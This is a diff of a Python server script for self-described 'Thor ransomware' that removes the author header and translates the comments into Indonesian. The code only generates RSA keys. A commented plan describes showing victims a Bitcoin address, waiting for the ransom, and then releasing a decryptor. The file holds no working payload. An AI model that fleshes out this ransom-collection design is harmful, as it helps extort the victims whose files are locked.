@@ -1,29 +1,26 @@
-# Date: 11/03/2019
-# Author: Mohamed
-# Description: Thor ransomware
-
 import os
 import server.lib.const as const
 from server.lib.crypto import CryptoRSA
 
 
-# check if RSA keys exist
+# periksa apakah kunci RSA ada
 if not os.path.exists(const.RSA_PRIVATE_KEY) or not os.path.exists(const.RSA_PUBLIC_KEY):
     publ, priv = CryptoRSA.gen_keys()
     CryptoRSA.save(publ, priv)
 
 
 if __name__ == '__main__':
-    # This is as far as I can carry you.
-    # I don't want the feds at my door.
-    # Please, don't do anything dumb.
+# Ini batas bantuan yang bisa saya berikan.
+# Saya tidak ingin punya masalah dengan pihak berwenang.
+# Tolong, jangan lakukan hal-hal bodoh.
 
-    # web server stuff
+
+# Hal-hal terkait web server
     '''
-    1. Generate and sign with server RSA private key a new path on web server
-    2. When that path is visited display a the target BTC address to the victim 
-    3. Wait until a certain amount of BTC is sent to that BTC address 
-    4. Generate a decryptor and wait for victim to hit that url path again 
-    5. Let victim download decryptor
+    1. Buat dan tanda tangani dengan kunci pribadi RSA server jalur baru di server web.
+    2. Ketika jalur tersebut dikunjungi, tampilkan alamat BTC target kepada korban.
+    3. Tunggu hingga sejumlah BTC tertentu dikirim ke alamat BTC tersebut.
+    4. Buat decryptor dan tunggu korban mengunjungi kembali jalur URL tersebut.
+    5. Biarkan korban mengunduh decryptor.
     '''
     ...
